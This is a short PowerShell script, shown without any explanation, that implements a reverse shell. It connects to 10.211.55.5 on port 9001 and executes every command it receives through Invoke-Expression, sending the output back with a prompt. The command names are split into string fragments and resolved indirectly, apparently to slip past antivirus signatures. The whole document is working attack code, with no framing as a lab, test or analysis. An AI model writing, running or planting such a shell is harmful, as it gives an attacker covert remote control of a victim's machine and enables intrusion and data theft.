
$u = "10.211.55.5"
$p = 9001


$c = [System.Activator]::CreateInstance([System.Net.Sockets.TcpClient], $u, $p)
$s = $c.GetStream()
$b = New-Object Byte[] 1024
$e = [System.Text.Encoding]::ASCII


$iex = ('I'+'E'+'X')
$os = ('Out'+'-'+'String')

$w = New-Object System.IO.StreamWriter($s)
While(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = $e.GetString($b, 0, $i)
    
   
    $r = try {
        & (Get-Alias $iex) $d | & (Get-Command $os)
    } catch {
        "Error: " + $_.Exception.Message
    }
    
    $r2 = $r + "PS " + (Get-Location).Path + "> "
    $w.Write($r2)
    $w.Flush()
}
$c.Close()
